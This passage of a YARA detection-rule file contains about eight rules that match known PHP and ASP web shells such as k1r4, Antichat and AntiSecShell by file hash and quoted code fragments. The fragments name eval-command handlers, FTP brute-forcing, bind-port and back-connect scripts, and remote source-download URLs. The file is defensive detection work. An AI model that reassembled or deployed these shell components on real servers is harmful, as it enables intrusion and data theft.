      $s14 = "<input name=\"u\" type=\"hidden\" id=\"u\" value=\"<%=user%>\"></td>" fullword ascii
      $s15 = "<input name=\"p\" type=\"hidden\" id=\"p\" value=\"<%=pass%>\"></td>" fullword ascii
      $s16 = "\"-RatioDown=1\" & vbCrLf & \"-RatiosCredit=0\" & vbCrLf & \"-QuotaCurrent=0\" & vbCrLf & \"-QuotaMaximum=0\" & vbCrLf & _" fullword ascii
      $s17 = "set f=Server.CreateObject(\"Scripting.FileSystemObject\")" fullword ascii
      $s18 = "If request.servervariables(\"SERVER_PORT\")=\"80\" Then " fullword ascii
      $s19 = "127.0.0.1:<%=port%>," fullword ascii
      $s20 = "set a=Server.CreateObject(\"Microsoft.XMLHTTP\")" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 20KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _a9b654f00c9d574dc9020ce75e344272_a9b654f00c9d574dc9020ce75e344272_143
{
   meta:
      description = "php17 - from files a9b654f00c9d574dc9020ce75e344272.php, a9b654f00c9d574dc9020ce75e344272.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c334d98c7e2196f598321a3e357997390eaf844e6c7b337c24bc40a332f018ad"
      hash2 = "c334d98c7e2196f598321a3e357997390eaf844e6c7b337c24bc40a332f018ad"
   strings:
      $s1 = "fread($fp,(512 - $file['stat'][7] % 512) == 512? 0 : (512 - $file['stat'][7] % 512));" fullword ascii
      $s2 = "header(\"Content-Transfer-Encoding: binary\");" fullword ascii
      $s3 = "<input type=\\\"button\\\" style=\\\"width:100\\\" onclick=\\\"test_prompt(71)\\\" value=\\\"\".et('Compress').\"\\\">\";" fullword ascii
      $s4 = "echo \"<nobr><a href=\\\"JavaScript:go('$dir_current')\\\"><font color=red> $fm_current_root</font></a></nobr><br>\\n\";" fullword ascii
      $s5 = "echo \"<nobr><a href=\\\"JavaScript:go('$dir_current')\\\"><font color=red> $dir_name</font></a></nobr><br>\\n\";" fullword ascii
      $s6 = "window.moveTo((window.screen.width-400)/2,((window.screen.height-200)/2)-20);" fullword ascii
      $s7 = "function execute_cmd(){" fullword ascii
      $s8 = "<input type=\\\"button\\\" style=\\\"width:100\\\" onclick=\\\"resolveIDs()\\\" value=\\\"\".et('ResolveIDs').\"\\\">\";" fullword ascii
      $s9 = "foreach($download_ext_filter as $key=>$ext){" fullword ascii
      $s10 = "<input type=\\\"button\\\" style=\\\"width:100\\\" onclick=\\\"chmod_form()\\\" value=\\\"\".et('Perms').\"\\\">\";" fullword ascii
      $s11 = "<input type=\\\"button\\\" style=\\\"width:80\\\" onclick=\\\"selectANI(this)\\\" value=\\\"\".et('SelInverse').\"\\\">" fullword ascii
      $s12 = "} else $ChkVerWarning .= \"<td><font color=red>\".et('ChkVerError').\"</font>\";" fullword ascii
      $s13 = "<input type=\\\"button\\\" style=\\\"width:80\\\" onclick=\\\"sel_dir(6)\\\" value=\\\"\".et('Move').\"\\\">" fullword ascii
      $s14 = "<input type=\\\"button\\\" style=\\\"width:80\\\" onclick=\\\"test(4)\\\" value=\\\"\".et('Rem').\"\\\">" fullword ascii
      $s15 = "<input type=\\\"button\\\" style=\\\"width:80\\\" onclick=\\\"sel_dir(5)\\\" value=\\\"\".et('Copy').\"\\\">" fullword ascii
      $s16 = "if (copy($temp_file,$file)){" fullword ascii
      $s17 = "$this->add_data($temp);" fullword ascii
      $s18 = "<table height=\\\"100%\\\" border=0 cellspacing=0 cellpadding=2 align=center>" fullword ascii
      $s19 = "$Pwd = getcwd();" fullword ascii
      $s20 = "return strcmp(strtolower($a['name']),strtolower($b['name']));" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _031d3c46f8a4462cf23accc3aaecf840f77d9a30_144b414a2168fecf31591bbe049e1424ccff4899_1477fa53e5e56605fe001c88831fcb71e30d6e86__144
{
   meta:
      description = "php17 - from files 031d3c46f8a4462cf23accc3aaecf840f77d9a30.php, 144b414a2168fecf31591bbe049e1424ccff4899.php, 1477fa53e5e56605fe001c88831fcb71e30d6e86.php, 1dc03138e5406f8e1f850181e92084ed0f4b5302.php, 20784cd31c22ddaa849b6c93042df34c1d462ab9.php, 35940353c0f3d6511e2789fc3cb9e5b3cea3b10d.php, 5bcb3adc55b62f4e43f154b29d31cced0cbd32a5.php, 649515a5730e7baa0303b29ce49f7e142b88c2ce.php, 691a4634dc5f78ceee68850138b8b68047b8dca6.php, 6f1a2aa579a8ecd60d17677f0cd211c4090500f6.php, 7bd7bb6237c7654d933dc363cabbc553f9d21382.php, 91241fc05105627c2f58942867db10b2b691574e.php, 918af72b83a165b25283dbd8f1490309dfdb77da.php, 942e0fc9984256f2bdb17f8d0c77a7afacb7b112.php, 946a66a5f7f8be95ea7693ee5500bb404b9d0add.php, 95570807b7c1a0531c134fb85c98cdc4ff63ee9b.php, a79be3a055b701ad9977b5176d0478aa0b0dffd4.php, a9b8077357065b95c2bc7f3ffa7baea65895d920.php, abdbeae0be991e8bab37946a1b55df5af144a0a8.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "27820c5a30e7d0c36e9e61b5f970de8121e1c493cf22ccdaa3b41f84016f8c5d"
      hash2 = "1fe4c60ea3f32819a98b1725581ac912d0f90d497e63ad81ccf258aeec59fee3"
      hash3 = "124a69cac6fa533abd737127a65ad261a4da66148bf1bdc341e3f733966b5ad6"
      hash4 = "bbbdf28407a4c943f048dcdd7da7515e42797a64b76fd2455e5403b436ec4de8"
      hash5 = "5d07fdfee2dc6d81da26f05028f79badd10dec066909932129d398627b2f4e94"
      hash6 = "9ecdb14b41785c779d9721e11bf9e1b7e35611015f4aabf9a1f54a82eaa0725c"
      hash7 = "e46777e5f1ac1652db3ce72dd0a2475ea515b37a737fffd743126772525a47e6"
      hash8 = "756b788401aad4bfd4dbafd15c382d98e3ba079390addb5b0cea7ff7f985f881"
      hash9 = "3c175446e4a5ddb7ddec93c3338097f3ef96b6edb9cc10801be12346d787f3c0"
      hash10 = "6dc417db9e07420a618d44217932ca8baf3541c08d5e68281e1be10af4280e4a"
      hash11 = "617ed1a8b61dd1f84acd225bfe8dc36c479a1ad3c98b2bb335b2735cb4fb2fe7"
      hash12 = "2e5511e45b7c9c6ca7e263ee8d8271214b2b6aae20f2796f4db7b53639f7a699"
      hash13 = "589ad371c414fae2d6f1f0ef7d197cf495bf06d1a0e367f9c3907b77f3054299"
      hash14 = "59105e4623433d5bf93b9e17d72a43a40a4d8ac99e4a703f1d8851ad1276cd88"
      hash15 = "1db0549066f294f814ec14ba4e9f63d88c4460d68477e5895236173df437d2b8"
      hash16 = "97ba3775928dacbf6b4d58416752db2113af88aa914bc35e7b2a7ddf73f70d8b"
      hash17 = "b7c6ce332434850db4448f8d2bf26157a6aa4ae1afb43bd5829ee6167b561c85"
      hash18 = "623d482f0f99bd37b67b2e98b697b7a19c08b2e296fd83fed439627b5a30cd3b"
      hash19 = "1a2bed0ae0b8846eb567043a998ad835d7e4103abcd6618e4ccb01a2a73a9ec9"
   strings:
      $s1 = ".txt;.php;.htm )\".in('hidden','cmd',0,'search_text').in('hidden','dir',0,$dir));" fullword ascii
      $s2 = "$db = @mssql_connect('localhost,'.$_POST['test4_port'],$_POST['test4_ml'],$_POST['test4_mp']);" fullword ascii
      $s3 = "ption><option value=\\\"C\\\">datapipe.c</option></select>\".in('hidden','dir',0,$dir));" fullword ascii
      $s4 = "echo sr(15,\"<b>\".$lang[$language.'_text55'].$arrow.\"</b>\",in('checkbox','m id=m',0,'1').in('text','s_mask',82,'.txt;.php')." ascii
      $s5 = "($_POST['test4_mp']):(\"password\"))).ws(4).\"<b>\".$lang[$language.'_text14'].$arrow.\"</b>\".in('text','test4_port',15,(!empty" ascii
      $s6 = "echo sr(15,\"<b>\".$lang[$language.'_text36'].$arrow.\"</b>\",in('text','test4_md',15,(!empty($_POST['test4_md'])?($_POST['test4" ascii
      $s7 = "echo sr(15,\"<b>\".$lang[$language.'_text3'].$arrow.\"</b>\",in('text','cmd',85,''));" fullword ascii
      $s8 = "T['test4_port'])?($_POST['test4_port']):(\"1433\"))));" fullword ascii
      $s9 = "if ($_POST['cmd']==\"php_eval\"){" fullword ascii
      $s10 = "echo sr(40,\"<b>\".$lang[$language.'_text13'].$arrow.\"</b>\",in('text','ip',15,((getenv('REMOTE_ADDR')) ? (getenv('REMOTE_ADDR'" ascii
      $s11 = "echo sr(15,\"<b>\".$lang[$language.'_text30'].$arrow.\"</b>\",in('text','test2_file',85,(!empty($_POST['test2_file'])?($_POST['t" ascii
      $s12 = "echo sr(15,\"<b>\".$lang[$language.'_text30'].$arrow.\"</b>\",in('text','test1_file',85,(!empty($_POST['test1_file'])?($_POST['t" ascii
      $s13 = "echo in('hidden','dir',0,$dir).in('hidden','cmd',0,'php_eval');" fullword ascii
      $s14 = "idden','cmd',0,'find_text').in('hidden','dir',0,$dir));" fullword ascii
      $s15 = "echo sr(15,\"<b>\".$lang[$language.'_text55'].$arrow.\"</b>\",in('checkbox','m id=m',0,'1').in('text','s_mask',82,'.txt;.php')." ascii
      $s16 = "if(@mssql_select_db($_POST['test4_md'],$db))" fullword ascii
      $s17 = "echo sr(15,\"<b>\".$lang[$language.'_text58'].$arrow.\"</b>\",in('text','mk_name',54,(!empty($_POST['mk_name'])?($_POST['mk_name" ascii
      $s18 = "echo $font.$lang[$language.'_text1'].\": <b>\".$_POST['cmd'].\"</b></font></td></tr><tr><td><b><div align=center><textarea name=" ascii
      $s19 = "echo sr(15,\"<b>\".$lang[$language.'_text3'].$arrow.\"</b>\",in('text','test4_file',96,(!empty($_POST['test4_file'])?($_POST['te" ascii
      $s20 = "option value=\\\"C\\\">C</option></select>\".in('hidden','dir',0,$dir));" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 600KB and ( 8 of them )
      ) or ( all of them )
}

rule _67782cfe732cea7fbc4c91e9133b005ad9401377_9f18fc1e8b779eec4d289eea454f05549d387a51_145
{
   meta:
      description = "php17 - from files 67782cfe732cea7fbc4c91e9133b005ad9401377.php, 9f18fc1e8b779eec4d289eea454f05549d387a51.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "65e7edf10ffb355bed81b7413c77d13d592f63d39e95948cdaea4ea0a376d791"
      hash2 = "d43cdb0daf132269b0a706a1a1b4970450fbaba34492e056305cab320f8c4ba5"
   strings:
      $s1 = "return \"http://milw0rm.com/search.php?dong=Linux Kernel \".$Lversion;" fullword ascii
      $s2 = "if (($_SERVER[\"PHP_AUTH_USER\"] != $auth[\"login\"]) or (md5($_SERVER[\"PHP_AUTH_PW\"]) != $auth[\"md5pass\"])) {" fullword ascii
      $s3 = "return \"http://milw0rm.com/search.php?dong=\".$OSV.\" \".$Lversion;" fullword ascii
      $s4 = "$safemodeexecdir = @ini_get(\"safe_mode_exec_dir\");" fullword ascii
      $s5 = "$sort_default = \"0a\"; #Pengurutan, 0 - nomor kolom. \"a\"scending atau \"d\"escending" fullword ascii
      $s6 = "if (!empty($auth[\"login\"])) {" fullword ascii
      $s7 = "header(\"WWW-Authenticate: Basic realm=\\\"\".$sh_name.\": Restricted Area\\\"\");" fullword ascii
      $s8 = "## QUICK COMMANDS ##" fullword ascii
      $s9 = ".shell {background-color:#000000;color:#00FF00;padding:5px;font-size:12;}" fullword ascii
      $s10 = "foreach ($auth[\"hostallow\"] as $k => $v) {" fullword ascii
      $s11 = "\"BindDoor\" => array($sh_mainurl.\"bind.tgz\",\"bind.tgz\")," fullword ascii
      $s12 = "if (empty($auth[\"md5pass\"])) { $auth[\"md5pass\"] = md5($auth[\"pass\"]); }" fullword ascii
      $s13 = "#pagebar,.mainpanel,input[type=\"submit\"],input[type=\"button\"] {background-color:#4A4A4A;}" fullword ascii
      $s14 = "$sort_save = TRUE; #Simpan posisi pengurutan menggunakan cookies." fullword ascii
      $s15 = "echo \"<center><b>Credits:</b><br>Idea, leading and coding by <b>tristram [CCTeaM]</b><br>\"." fullword ascii
      $s16 = "<div  class=bartitle><b>.: COMMANDS PANEL :.</b></div>" fullword ascii
      $s17 = "array(\"Kill-Shell\",$surl.\"act=selfremove\")," fullword ascii
      $s18 = "## END FILESYSTEM FUNCTIONS ##" fullword ascii
      $s19 = "## HEADERS ##" fullword ascii
      $s20 = "## FILESYSTEM FUNCTIONS ##" fullword ascii
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0xbbef ) and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _Antichat_Shell__Modified_by_Go0o_Antichat_Shell_Modified_by_Go0o_146
{
   meta:
      description = "php17 - from files Antichat_Shell._Modified_by_Go0o.php, Antichat_Shell_Modified_by_Go0o.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "4bbf0521ec9f2c1ebcfba9da1f0008df21b7199327ea9b475c3fdd707d918b23"
      hash2 = "cdd96e4dcce2cd8c3156108eec776d5c40879fb01b0ea80dfa190e8f3e51cb05"
   strings:
      $s1 = "$content.=(!empty($_POST['dif_name'])?($_POST['dif_name']):(\"dump.sql\"));" fullword ascii
      $s2 = "$content.=(!empty($_POST['mysql_p'])?($_POST['mysql_p']):(\"password\"));" fullword ascii
      $s3 = "$content.=\"<form name='dump2' action='$php_self' method='post'>" fullword ascii
      $s4 = "$content.=\"<form name='dump1' action='$php_self' method='POST'>" fullword ascii
      $s5 = "$content=\"<table><form action='$php_self' method=post name=md5><tr><td><b>Decrypte MD5</b>" fullword ascii
      $s6 = "$content.=(!empty($_POST['mysql_tbl'])?($_POST['mysql_tbl']):(\"user\"));" fullword ascii
      $s7 = "$content.=\"<form name='conn' action='$php_self' method='post'><input type=hidden name=conn value=0>" fullword ascii
      $s8 = "$content.=(!empty($_POST['mysql_l'])?($_POST['mysql_l']):(\"root\"));" fullword ascii
      $s9 = "$content.=(!empty($_POST['mysql_db'])?($_POST['mysql_db']):(\"mysql\"));" fullword ascii
      $s10 = "$content.=\"<tr><td>Name dirs and files</td><td>type</td><td>size</td><td>permission</td><td>options</td></tr>\";" fullword ascii
      $s11 = "@$login=$_POST['login'];" fullword ascii
      $s12 = "inkfile.'\\';document.reqs.dir.value=\\''.$dir.'\\'; document.reqs.submit();\" title=\"Delete this file\">X</a></td></tr>'; " fullword ascii
      $s13 = "bl.value='$str[0]';document.dump2.submit();\\\">$str[0]</a></table>\";" fullword ascii
      $s14 = "$content.=\"<td>&nbsp;</td><td bgcolor=#44474f><font color=red> $name </font></td> \";" fullword ascii
      $s15 = "$content.='<tr><td><a href=\"#\" onclick=\"document.reqs.action.value=\\'editor\\';document.reqs.dir.value=\\''.$dir.'\\'; docum" ascii
      $s16 = "(@ini_get('safe_mode')==\"1\" ? $safe_mode=\"ON\" : $safe_mode=\"OFF\");" fullword ascii
      $s17 = "$content.= \"<td>&nbsp;</td><td bgcolor=#44474f>$nst_inside</td>\\r\\n\";" fullword ascii
      $s18 = "$form_win=\"<table><form method=POST enctype=multipart/form-data>" fullword ascii
      $s19 = "$content.= \"<table><a href=\\\"#\\\" onclick=\\\"document.dump1.db.value='$str[0]';document.dump1.tbl.value='$str[0]';document." ascii
      $s20 = "$content.=\"><input type=hidden name=dir size=85 value=\".$dir.\">" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 90KB and ( 8 of them )
      ) or ( all of them )
}

rule _01e9565cecc4e989123f9620c1d09c09_01f78be6f7cad02658508fe4616098a9_05311655a15b75fab86956663e1819cd_0ad17701cf5e5a59aa57f35a_147
{
   meta:
      description = "php17 - from files 01e9565cecc4e989123f9620c1d09c09.php, 01f78be6f7cad02658508fe4616098a9.php, 05311655a15b75fab86956663e1819cd.php, 0ad17701cf5e5a59aa57f35aa240d9e40d28ba50.php, 0b544ac96e173af11ffee87dee8aad446339801e.php, 15e786a334203308d12856d155bbdb8088ed8afc.php, 15febc7c452fb361fc5eca8e67711a86a9ee0b9e.php, 1898eebe767f4dda4709621164eeef8377c43bb3.php, 27.9.php, 32e36b9cd77416c8e4d5d7284d54683e75abfed6.php, 36c1b4eaebafcab661febec9cbce65e6c4e063d4.php, 398fcc4176cbdefb9271ad67decbab5c08312bf2.php, 44b8eca32932e4e42f0d59dfe67014b2bba88292.php, 4d5d25e5c18789e5e3977c1d7f6035576a7e2ea3.php, 5a42c89ac7b0e1b19603088b61aeed203e026fc3.php, 626c5c9305cee457e10b85c81af262c5bc437255.php, 6612561e19ec45c494d5154c3b502a2e72817735.php, 67782cfe732cea7fbc4c91e9133b005ad9401377.php, 6a6f0260611dcd60d502d308f74ff3c1ad590cfe.php, 8cb6a80a86bf37cd3977cab94909c299ec22a092.php, 9f18fc1e8b779eec4d289eea454f05549d387a51.php, acid.php, acidshell.php, AntiSecShell.v0.5.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9711738fbc89cd6b37366690193dfdd6402af920106426ff9d33aae65eaba5c8"
      hash2 = "ae6e0b74f1a1697985e45ec9fbd291fbc9ace52680fc2fd14726abf66859138a"
      hash3 = "0202f72b3e8b62e5ebc99164c7d4eb8ec5be6a7527286e9059184aa8321e0092"
      hash4 = "59f77ca5eb2380fcee10e7282bdcbb628a075bd83ff3dfabd2b8851cc80a466b"
      hash5 = "12e93dd17c20d1aef103ccc66e1b7d5b3849b81a0ab88e8c03777a7a88fbebf0"
      hash6 = "f89d440580f05dbadc7464f2ef8d0048d367422d6fce60995a0f33467284e503"
      hash7 = "7a69466dbd18182ce7da5d9d1a9447228dcebd365e0fe855d0e02024f4117549"
      hash8 = "ef3a7cd233a880fc61efc3884f127dd8944808babd1203be2400144119b6057f"
      hash9 = "dd984fae70333dc6899b7e226362573ddef2d1185a4349e832a86c9f90ee2b3f"
      hash10 = "5ac936e86e90cda1df398a4f3044c9d6d1707bc6ddf5d1bbdfc9e03553ff907b"
      hash11 = "dad311ac627ea5509814218f21e1f11d0f61632866aadaf5c3a43629f5801c1b"
      hash12 = "2884d456f6a33415db1ce6c8ef4a9a6ed860b3f76482c8460d27bd83120858ab"
      hash13 = "2b8aed49f50acd0c1b89a399647e1218f2a8545da96631ac0882da28810eecc4"
      hash14 = "ce802123ee19441adab36ef70584cfadbbda898ed1d52082a08532e20c860dc1"
      hash15 = "353f44323be3b6564790acced0c8cbe76aa864515b16c8f8de3571fb15044481"
      hash16 = "bbe0f7278041cb3a6338844aa12c3df6b700a12a78b0a58bce3dce14f1c37b96"
      hash17 = "bf83456b0b6f02b4bc25f1848c7f825cd7505f2c740f01c1a254df33bfebfa06"
      hash18 = "65e7edf10ffb355bed81b7413c77d13d592f63d39e95948cdaea4ea0a376d791"
      hash19 = "178ec234348b08e4da3d0d26f0e0db9637184e9fb4aec6b7345a5521c54456ac"
      hash20 = "f5e8951fddabbfebee6f93380486d027fd88f05623f3856dcf81ae05e78d9da6"
      hash21 = "d43cdb0daf132269b0a706a1a1b4970450fbaba34492e056305cab320f8c4ba5"
      hash22 = "a6580477b138c01f062a33f2f204f412d3ffcdfd44dd6bffe476aefefab1fca3"
      hash23 = "a455a962041f9ef980414ecb1695c263cea42c41731caf1f0c34293cc937b1ef"
      hash24 = "da5ea23323881addae2ecd9a44947f05d5dbc216ac24cdf9361b14f18ea8e31c"
   strings:
      $x1 = "else {$tmp = htmlspecialchars(\"./dump_\".getenv(\"SERVER_NAME\").\"_\".$sql_db.\"_\".date(\"d-m-Y-H-i-s\").\".sql\");}" fullword ascii
      $x2 = "$file = $tmpdir.\"dump_\".getenv(\"SERVER_NAME\").\"_\".$db.\"_\".date(\"d-m-Y-H-i-s\").\".sql\";" fullword ascii
      $s3 = "header(\"Content-disposition: attachment; filename=\\\"\".basename($sql_dump_file).\"\\\";\");" fullword ascii
      $s4 = "if ($fqb_onlywithsh) {$TRUE = (!in_array($sh,array(\"/bin/FALSE\",\"/sbin/nologin\")));}" fullword ascii
      $s5 = "getenv(\"PHPRC\").\" -q %f%\" => array(\"php\",\"php3\",\"php4\")," fullword ascii
      $s6 = "elseif ($ft == \"ini\") {echo \"<pre>\"; var_dump(parse_ini_file($d.$f,TRUE)); echo \"</pre>\";}" fullword ascii
      $s7 = "$objects = array_merge($objects[\"head\"],$objects[\"folders\"],$objects[\"links\"],$objects[\"files\"]);" fullword ascii
      $s8 = "$result = mysql_query(\"SHOW PROCESSLIST\", $sql_sock);" fullword ascii
      $s9 = "$table = array_merge($tab[\"cols\"],$tab[\"head\"],$tab[\"folders\"],$tab[\"links\"],$tab[\"files\"]);" fullword ascii
      $s10 = "echo \"<b>Connected to \".getenv(\"SERVER_NAME\").\" with login \\\"\".$str[0].\"\\\" and password \\\"\".$str[0].\"\\\"</b><br>" ascii
      $s11 = "if ($o == \".\") {$checkbox = \"<input type=\\\"checkbox\\\" name=\\\"actbox[]\\\" onclick=\\\"ls_reverse_all();\\\">\"; $i--;}" fullword ascii
      $s12 = "$bool = (empty($a[\"name_regexp\"]) and strpos($f,$a[\"name\"]) !== FALSE) || ($a[\"name_regexp\"] and ereg($a[\"name\"],$f));" fullword ascii
      $s13 = "if (!function_exists(\"posix_kill\") and !in_array(\"posix_kill\",$disablefunc)) {function posix_kill($gid) {return FALSE;}}" fullword ascii
      $s14 = "$tmpdir = ini_get(\"upload_tmp_dir\");" fullword ascii
      $s15 = "while ($row = mysql_fetch_array($result, MYSQL_NUM)) {echo \"<tr><td>\".$row[0].\"</td><td>\".$row[1].\"</td></tr>\";}" fullword ascii
      $s16 = "$v = @ob_get_contents();" fullword ascii
      $s17 = "if (substr($tmpdir,-1) != DIRECTORY_SEPARATOR) {$tmpdir .= DIRECTORY_SEPARATOR;}" fullword ascii
      $s18 = "echo ($ow[\"name\"]?$ow[\"name\"]:fileowner($d.$f)).\"/\".($gr[\"name\"]?$gr[\"name\"]:filegroup($d.$f));" fullword ascii
      $s19 = "$row[] = ($ow[\"name\"]?$ow[\"name\"]:fileowner($d)).\"/\".($gr[\"name\"]?$gr[\"name\"]:filegroup($d));" fullword ascii
      $s20 = "$row[] = ($ow[\"name\"]?$ow[\"name\"]:fileowner($v)).\"/\".($gr[\"name\"]?$gr[\"name\"]:filegroup($v));" fullword ascii
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0x6544 or uint16(0) == 0x733c or uint16(0) == 0x2a2f or uint16(0) == 0xbbef ) and filesize < 700KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _01a00e6583ed3789694d600fa831392aa785c5f9_184904fad2bac801b5ffd71da2725ce099c1c077_26aff140c2f73f11d0c78b8823ade092_528f2ab6_148
{
   meta:
      description = "php17 - from files 01a00e6583ed3789694d600fa831392aa785c5f9.php, 184904fad2bac801b5ffd71da2725ce099c1c077.php, 26aff140c2f73f11d0c78b8823ade092.php, 528f2ab667dc8492e589a00c579edaaf16f03859.php, 8d87d250b39b4f622107217f9454c057c76b3ae9.php, aa0fc6f621e8b2965b3a109832117d023f4a1ad6.php, arabicspy.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "7e680486104e6dc00dcf1d07faa73d92bb3505caaffcae2941a5624bf82db6f0"
      hash2 = "93419ee1a9f3416109cebe714b01364db8c45b9ff1d254ef3d8eff21c593b262"
      hash3 = "1a96d8b149d930cfea410ba3c247efac03bd71e4fec0460f3522950b1fd13a19"
      hash4 = "5aad1a2e4c160a826e6d62b34f0d1ecc9bd9ffc688774fb055f7e0cf50d08e66"
      hash5 = "ae4d2498d852c2c2908709acc93ef11d8eb6f4ed698c606ec7aa2d76385365aa"
      hash6 = "2a0cd4aab8539cd4e85ece7e5a8251ae6cc21816a20023f6ddb5d979c98d2cb3"
      hash7 = "9ca895d820411a2b1c4f1f5ca668d10550b897342126ffee1b58f3f1e9d38897"
   strings:
      $s1 = "echo \" <form action=\\\"$action\\\" method=\\\"POST\\\"\".$target.\">\\n\";" fullword ascii
      $s2 = "$target = empty($target) ? \"\" : \" target=\\\"\".$target.\"\\\"\";" fullword ascii
      $s3 = "<td align=\\\"\".$align.\"\\\"\".$height.\" \".$colspan.\" \".$extra.\">\".$content.\"</td>\\n\";" fullword ascii
      $s4 = "function tdbody($content,$align='center',$bgcolor='2',$height='',$extra='',$colspan='') {" fullword ascii
      $s5 = "function formheader($action='',$title,$target='') {" fullword ascii
      $s6 = "$input = \"<input name=\\\"$name\\\" value=\\\"$value\\\" type=\\\"$type\\\" \".$css.\" size=\\\"$size\\\" $extra>\\n\";" fullword ascii
      $s7 = "echo \"<table width=\\\"775\\\" border=\\\"0\\\" cellpadding=\\\"3\\\" cellspacing=\\\"1\\\" bgcolor=\\\"#ffffff\\\">\\n\";" fullword ascii
      $s8 = "function maketextarea($name,$content='',$cols='100',$rows='20',$extra=''){" fullword ascii
      $s9 = "echo \"  <form action=\\\"\".$arg[action].\"\\\" method=\\\"\".$arg[method].\"\\\" $enctype>\\n\";" fullword ascii
      $s10 = "$select .= \"<option value=\\\"$key\\\" selected>$value</option>\\n\";" fullword ascii
      $s11 = "function makeinput($name,$value='',$extra='',$type='text',$size='30',$css='input'){" fullword ascii
      $s12 = "if ($kname != \"PRIMARY\" and $key['Non_unique'] == 0) {" fullword ascii
      $s13 = "$select .= \"<option value=\\\"$key\\\">$value</option>\\n\";" fullword ascii
      $s14 = "echo \"<input type=\\\"hidden\\\" name=\\\"$name\\\" value=\\\"$value\\\">\\n\";" fullword ascii
      $s15 = "function headerform($arg=array()) {" fullword ascii
      $s16 = "$rows = mysql_query(\"SELECT * FROM $table\");" fullword ascii
      $s17 = "foreach ($arg[option] AS $key=>$value) {" fullword ascii
      $s18 = "$arg[method] = \"POST\";" fullword ascii
      $s19 = "function tdheader($title) {" fullword ascii
      $s20 = "function tableheader() {" fullword ascii
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0x683c ) and filesize < 400KB and ( 8 of them )
      ) or ( all of them )
}

rule _0b544ac96e173af11ffee87dee8aad446339801e_6a6f0260611dcd60d502d308f74ff3c1ad590cfe_149
{
   meta:
      description = "php17 - from files 0b544ac96e173af11ffee87dee8aad446339801e.php, 6a6f0260611dcd60d502d308f74ff3c1ad590cfe.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "12e93dd17c20d1aef103ccc66e1b7d5b3849b81a0ab88e8c03777a7a88fbebf0"
      hash2 = "178ec234348b08e4da3d0d26f0e0db9637184e9fb4aec6b7345a5521c54456ac"
   strings:
      $x1 = "function k1r4ftpbrutecheck($host,$port,$timeout,$login,$pass,$sh,$fqb_onlywithsh)" fullword ascii
      $s2 = "$logfile = $tmpdir_logs.\"k1r4_ftpquickbrute_\".date(\"d.m.Y_H_i_s\").\".log\";" fullword ascii
      $s3 = "elseif (!$data = k1r4getsource($datapipe[\"src\"])) {echo \"Can't download sources!\";}" fullword ascii
      $s4 = "$k1r4_updateurl = \"http://emp3ror.com/kira//update/\"; //Update server" fullword ascii
      $s5 = ".$k.\"][0] - unknown command.\"; k1r4exit();}" fullword ascii
      $s6 = "$bindport_pass = \"k1r4\";  // default password for binding" fullword ascii
      $s7 = "$k1r4_sourcesurl = \"http://emp3ror.com/kira/\"; //Sources-server" fullword ascii
      $s8 = "if ((!is_numeric($r[1])) or ($r[1] > 3)) {$r[1] = 0; ob_clean(); echo \"Warning! Configuration error in \\$regxp_highlight[\".$k" ascii
      $s9 = "elseif (!$data = k1r4getsource($bind[\"src\"])) {echo \"Can't download sources!\";}" fullword ascii
      $s10 = "if (k1r4ftpbrutecheck(\"localhost\",21,1,$str[0],$str[0],$str[6],$fqb_onlywithsh))" fullword ascii
      $s11 = "if ($actemptybuff) {$sess_data[\"copy\"] = $sess_data[\"cut\"] = array(); k1r4_sess_put($sess_data);}" fullword ascii
      $s12 = "\"k1r4_bindport.pl\" => \"k1r4_bindport_pl.txt\"," fullword ascii
      $s13 = "\"k1r4_datapipe.pl\" => \"k1r4_datapipe_pl.txt\"," fullword ascii
      $s14 = "\"k1r4_datapipe.pl\"=>array(\"Using PERL\",\"perl %path %localport %remotehost %remoteport\")," fullword ascii
      $s15 = "\"k1r4_bindport.c\" => \"k1r4_bindport_c.txt\"," fullword ascii
      $s16 = "\"k1r4_datapipe.c\" => \"k1r4_datapipe_c.txt\"," fullword ascii
      $s17 = "if ($name) {return file_get_contents($k1r4_sourcesurl.$name);}" fullword ascii
      $s18 = "\"k1r4_datapipe.c\"=>array(\"Using C\",\"%path %localport %remoteport %remotehost\")" fullword ascii
      $s19 = "elseif (!$data = k1r4getsource($bc[\"src\"])) {echo \"Can't download sources!\";}" fullword ascii
      $s20 = "\"k1r4_backconn.pl\"=>array(\"Using PERL\",\"perl %path %host %port\")," fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _01e9565cecc4e989123f9620c1d09c09_01f78be6f7cad02658508fe4616098a9_05311655a15b75fab86956663e1819cd_0ad17701cf5e5a59aa57f35a_150
{
   meta:
